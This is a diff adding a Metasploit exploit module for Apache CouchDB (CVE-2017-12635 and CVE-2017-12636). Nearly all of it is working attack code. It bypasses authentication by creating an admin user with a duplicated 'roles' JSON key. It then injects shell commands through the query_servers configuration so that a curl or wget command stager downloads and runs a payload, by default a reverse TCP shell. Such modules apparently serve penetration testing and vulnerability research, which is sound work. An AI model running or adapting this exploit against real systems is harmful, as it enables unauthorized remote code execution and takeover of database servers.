@@ -1,0 +1,317 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Apache CouchDB Arbitrary Command Execution',
+      'Description'    => %q{
+        CouchDB administrative users can configure the database server via HTTP(S).
+        Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB.
+        This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user,
+        including downloading and executing scripts from the public internet.
+      },
+      'Author' => [
+        'Max Justicz',                       # CVE-2017-12635 Vulnerability discovery
+        'Joan Touzet',                       # CVE-2017-12636 Vulnerability discovery
+        'Green-m <greenm.xxoo[at]gmail.com>' # Metasploit module
+      ],
+      'References' => [
+        ['CVE', '2017-12636'],
+        ['CVE', '2017-12635'],
+        ['URL', 'https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],
+        ['URL', 'http://docs.couchdb.org/en/latest/cve/2017-12636.html'],
+        ['URL', 'https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E']
+      ],
+      'DisclosureDate' => 'Apr 6 2016',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'linux',
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Privileged'     => false,
+      'DefaultOptions' => {
+        'PAYLOAD' => 'linux/x64/shell_reverse_tcp',
+        'CMDSTAGER::FLAVOR' => 'curl'
+      },
+      'CmdStagerFlavor' => ['curl', 'wget'],
+      'Targets' => [
+        ['Automatic',                  {}],
+        ['Apache CouchDB version 1.x', {}],
+        ['Apache CouchDB version 2.x', {}]
+      ],
+      'DefaultTarget' => 0
+    ))
+
+    register_options([
+      Opt::RPORT(5984),
+      OptString.new('URIPATH', [false, 'The URI to use for this exploit to download and execute. (default is random)']),
+      OptString.new('HttpUsername', [false, 'The username to login as']),
+      OptString.new('HttpPassword', [false, 'The password to login with'])
+    ])
+
+    register_advanced_options([
+      OptInt.new('Attempts', [false, 'The number of attempts to execute the payload.']),
+      OptString.new('WritableDir', [true, 'Writable directory to write temporary payload on disk.', '/tmp'])
+    ])
+  end
+
+  def check
+    get_version
+    version = Gem::Version.new(@version)
+    return CheckCode::Unknown if version.version.empty?
+    vprint_status "Found CouchDB version #{version}"
+
+    return CheckCode::Appears if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
+
+    CheckCode::Safe
+  end
+
+  def exploit
+    fail_with(Failure::Unknown, "Something went horribly wrong and we couldn't continue to exploit.") unless get_version
+    version = @version
+
+    vprint_good("#{peer} - Authorization bypass successful") if auth_bypass
+
+    print_status("Generating #{datastore['CMDSTAGER::FLAVOR']} command stager")
+    @cmdstager = generate_cmdstager(
+      temp: datastore['WritableDir'],
+      file: File.basename(cmdstager_path)
+    ).join(';')
+
+    register_file_for_cleanup(cmdstager_path)
+
+    if !datastore['Attempts'] || datastore['Attempts'] <= 0
+      attempts = 1
+    else
+      attempts = datastore['Attempts']
+    end
+
+    attempts.times do |i|
+      print_status("#{peer} - The #{i + 1} time to exploit")
+      send_payload(version)
+      Rex.sleep(5)
+      # break if we get the shell
+      break if session_created?
+    end
+  end
+
+  # CVE-2017-12635
+  # The JSON parser differences result in behaviour that if two 'roles' keys are available in the JSON,
+  # the second one will be used for authorising the document write, but the first 'roles' key is used for subsequent authorization
+  # for the newly created user.
+  def auth_bypass
+    username = datastore['HttpUsername'] || Rex::Text.rand_text_alpha_lower(4..12)
+    password = datastore['HttpPassword'] || Rex::Text.rand_text_alpha_lower(4..12)
+    @auth = basic_auth(username, password)
+
+    res = send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/_users/org.couchdb.user:#{username}"),
+      'method'        => 'PUT',
+      'ctype'         => 'application/json',
+      'data'          => %({"type": "user","name": "#{username}","roles": ["_admin"],"roles": [],"password": "#{password}"})
+    )
+
+    if res && (res.code == 200 || res.code == 201) && res.get_json_document['ok']
+      return true
+    else
+      return false
+    end
+  end
+
+  def get_version
+    @version = nil
+
+    begin
+      res = send_request_cgi(
+        'uri'           => normalize_uri(target_uri.path),
+        'method'        => 'GET',
+        'authorization' => @auth
+      )
+    rescue Rex::ConnectionError
+      vprint_bad("#{peer} - Connection failed")
+      return false
+    end
+
+    unless res
+      vprint_bad("#{peer} - No response, check if it is CouchDB. ")
+      return false
+    end
+
+    if res && res.code == 401
+      print_bad("#{peer} - Authentication required.")
+      return false
+    end
+
+    if res && res.code == 200
+      res_json = res.get_json_document
+
+      if res_json.empty?
+        vprint_bad("#{peer} - Cannot parse the response, seems like it's not CouchDB.")
+        return false
+      end
+
+      @version = res_json['version'] if res_json['version']
+      return true
+    end
+
+    vprint_warning("#{peer} - Version not found")
+    return true
+  end
+
+  def send_payload(version)
+    vprint_status("#{peer} - CouchDB version is #{version}") if version
+
+    version = Gem::Version.new(@version)
+    if version.version.empty?
+      vprint_warning("#{peer} - Cannot retrieve the version of CouchDB.")
+      # if target set Automatic, exploit failed.
+      if target == targets[0]
+        fail_with(Failure::NoTarget, "#{peer} - Couldn't retrieve the version automaticly, set the target manually and try again.")
+      elsif target == targets[1]
+        payload1
+      elsif target == targets[2]
+        payload2
+      end
+    elsif version < Gem::Version.new('1.7.0')
+      payload1
+    elsif version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
+      payload2
+    elsif version >= Gem::Version.new('1.7.0') || Gem::Version.new('2.1.0')
+      fail_with(Failure::NotVulnerable, "#{peer} - The target is not vulnerable.")
+    end
+  end
+
+  # Exploit with multi requests
+  # payload1 is for the version of couchdb below 1.7.0
+  def payload1
+    rand_cmd1 = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_cmd2 = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_db = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_doc = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_hex = Rex::Text.rand_text_hex(32)
+    rand_file = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8..16)}"
+
+    register_file_for_cleanup(rand_file)
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/_config/query_servers/#{rand_cmd1}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'data'          => %("echo '#{@cmdstager}' > #{rand_file}")
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}"),
+      'method'        => 'PUT',
+      'authorization' => @auth
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}/#{rand_doc}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'data'          => %({"_id": "#{rand_hex}"})
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}/_temp_view?limit=20"),
+      'method'        => 'POST',
+      'authorization' => @auth,
+      'ctype'         => 'application/json',
+      'data'          => %({"language":"#{rand_cmd1}","map":""})
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/_config/query_servers/#{rand_cmd2}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'data'          => %("/bin/sh #{rand_file}")
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}/_temp_view?limit=20"),
+      'method'        => 'POST',
+      'authorization' => @auth,
+      'ctype'         => 'application/json',
+      'data'          => %({"language":"#{rand_cmd2}","map":""})
+    )
+  end
+
+  # payload2 is for the version of couchdb below 2.1.1
+  def payload2
+    rand_cmd1 = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_cmd2 = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_db = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_doc = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_tmp = Rex::Text.rand_text_alpha_lower(4..12)
+    rand_hex = Rex::Text.rand_text_hex(32)
+    rand_file = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8..16)}"
+
+    register_file_for_cleanup(rand_file)
+
+    res = send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/_membership"),
+      'method'        => 'GET',
+      'authorization' => @auth
+    )
+
+    node = res.get_json_document['all_nodes'][0]
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/_node/#{node}/_config/query_servers/#{rand_cmd1}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'data'          => %("echo '#{@cmdstager}' > #{rand_file}")
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}"),
+      'method'        => 'PUT',
+      'authorization' => @auth
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}/#{rand_doc}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'data'          => %({"_id": "#{rand_hex}"})
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}/_design/#{rand_tmp}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'ctype'         => 'application/json',
+      'data'          => %({"_id":"_design/#{rand_tmp}","views":{"#{rand_db}":{"map":""} },"language":"#{rand_cmd1}"})
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/_node/#{node}/_config/query_servers/#{rand_cmd2}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'data'          => %("/bin/sh #{rand_file}")
+    )
+
+    send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/#{rand_db}/_design/#{rand_tmp}"),
+      'method'        => 'PUT',
+      'authorization' => @auth,
+      'ctype'         => 'application/json',
+      'data'          => %({"_id":"_design/#{rand_tmp}","views":{"#{rand_db}":{"map":""} },"language":"#{rand_cmd2}"})
+    )
+  end
+
+  def cmdstager_path
+    @cmdstager_path ||=
+      "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8)}"
+  end
+
+end
